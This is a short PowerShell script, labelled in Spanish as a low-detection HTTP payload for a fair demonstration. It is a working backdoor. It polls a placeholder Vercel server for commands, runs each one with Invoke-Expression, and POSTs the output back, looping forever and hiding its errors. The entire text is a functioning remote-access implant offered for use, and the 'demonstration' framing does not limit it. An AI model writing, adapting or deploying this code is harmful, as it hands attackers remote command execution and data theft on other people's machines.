# ================================================
# PAYLOAD HTTP - DEMOSTRACION FERIA (Baja Deteccion)
# ================================================

$server = "https://tu-pagina.vercel.app"   # ← Cambia esto por tu link de Vercel

while ($true) {
    try {
        $cmd = Invoke-WebRequest -Uri "$server/comando" -UseBasicParsing -TimeoutSec 5
        if ($cmd.Content -and $cmd.Content -ne "null") {
            $result = Invoke-Expression $cmd.Content 2>&1 | Out-String
            Invoke-WebRequest -Uri "$server/respuesta" -Method POST -Body $result -UseBasicParsing | Out-Null
        }
    } catch {}
    Start-Sleep -Seconds 8
}